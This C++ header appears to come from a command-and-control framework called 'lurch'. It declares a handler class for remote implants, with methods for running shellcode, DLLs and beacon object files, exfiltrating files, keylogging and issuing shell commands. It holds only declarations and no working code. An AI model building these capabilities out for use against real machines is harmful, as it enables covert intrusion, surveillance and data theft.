//
// Created by diago on 2024-04-25.
//

#ifndef AGENT_HPP
#define AGENT_HPP
#include <argument_parser.hpp>
#include <base.hpp>


namespace lurch {
class baphomet final : public leaf {
private:
    std::queue<std::string> tasks;
    static accepted_commands commands;
    static std::unordered_map<std::string, std::function<result<std::string>(baphomet*, reciever_context&)>> callables;

    struct {
        std::string ip;
        std::string token;
    } connected_agent_data;

public:

    result<std::string> runexe(reciever_context& ctx);
    result<std::string> rundll(reciever_context& ctx);
    result<std::string> runshellcode(reciever_context& ctx);
    result<std::string> runbof(reciever_context& ctx);

    result<std::string> get_task(reciever_context& ctx) const;
    result<std::string> complete_task(reciever_context& ctx);
    result<std::string> print_tasks() const;
    result<std::string> print_staged_files() const;
    result<std::string> clear_tasks();
    result<std::string> print_listeners() const;

    result<std::string> cp(reciever_context& ctx);
    result<std::string> cat(reciever_context& ctx);
    result<std::string> cd(reciever_context& ctx);
    result<std::string> mkdir(reciever_context& ctx);
    result<std::string> rm(reciever_context& ctx);
    result<std::string> ps(reciever_context& ctx);
    result<std::string> cmd(reciever_context& ctx);
    result<std::string> exfil(reciever_context& ctx);
    result<std::string> indicate_exit(reciever_context& ctx);
    result<std::string> checkin(reciever_context& ctx);
    result<std::string> keylog(reciever_context& ctx);
    result<std::string> start_listener(reciever_context& ctx) const;


    static result<std::string>      delimit_command(const std::vector<std::string>& strings);
    static void                     init_commands();
    result<std::string>             generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
    bool                            file_is_staged(const std::string& file_name) const;


    result<std::filesystem::path>   upload(const std::string &file, const std::string &extension) override;
    result<std::string>             receive(reciever_context& ctx) override;

    ~baphomet() override;
    explicit baphomet(const std::optional<std::weak_ptr<owner>> &parent, instance* const root)
        : leaf(parent, root) {
    }
};

} // lurch

#endif //AGENT_HPP
